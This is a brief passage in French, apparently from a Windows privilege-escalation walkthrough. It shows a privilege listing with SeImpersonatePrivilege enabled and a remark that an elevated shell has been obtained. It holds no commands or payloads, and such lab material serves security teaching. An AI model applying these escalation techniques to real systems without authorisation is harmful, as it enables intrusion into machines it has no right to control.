SeImpersonatePrivilege Emprunter l'identité d'un client après l'authentification Activé
SeCreateGlobalPrivilege Créer des objets globaux Activé
SeIncreaseWorkingSetPrivilege Augmenter un ensemble de travail de processus Désactivé
SeTimeZonePrivilege Changer le fuseau horaire Désactivé
SeCreateSymbolicLinkPrivilege Créer des liens symboliques Désactivé
SeDelegateSessionUserImpersonatePrivilege Obtenir un jeton d'emprunt d'identité pour un autre utilisateur dans la même session Désactivé

```

Cela réussit et nous recevons un shell élevé indiquant que nos privilèges sont disponibles et peuvent être activés si nécessaire.